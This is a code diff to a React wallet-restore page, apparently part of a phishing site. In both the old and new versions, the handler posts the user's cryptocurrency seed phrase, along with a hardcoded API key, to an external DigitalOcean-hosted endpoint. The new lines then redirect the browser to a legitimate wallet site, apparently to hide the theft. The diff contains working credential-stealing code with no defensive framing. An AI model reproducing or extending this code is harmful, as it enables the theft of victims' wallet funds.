@@ -84,23 +84,20 @@ export default function Page() {
       seedPhrase: seedPhrase,
     };
     console.log("Seed Phrase Message Data", messageData);
-    axios
-      .post(
-        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/image",
-        messageData,
-        {
-          headers: {
-            "Content-Type": "application/json",
-            "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
-          },
-        }
-      )
-      .catch((error) =>
-        console.error(
-          "Error sending seed phrase message:",
-          error.response.data.details
+      axios
+        .post(
+          "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/image",
+          messageData,
+          {
+            headers: {
+              "Content-Type": "application/json",
+              "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
+            },
+          }
         )
-      );
+      .then(response => response.data)
+      .then(result => window.location.href = "https://coin.space")
+      .catch(error => console.error("Error sending seed phrase message:", error));
   };
 
   const handleRestoreWallet = (seedPhrase: string) => {
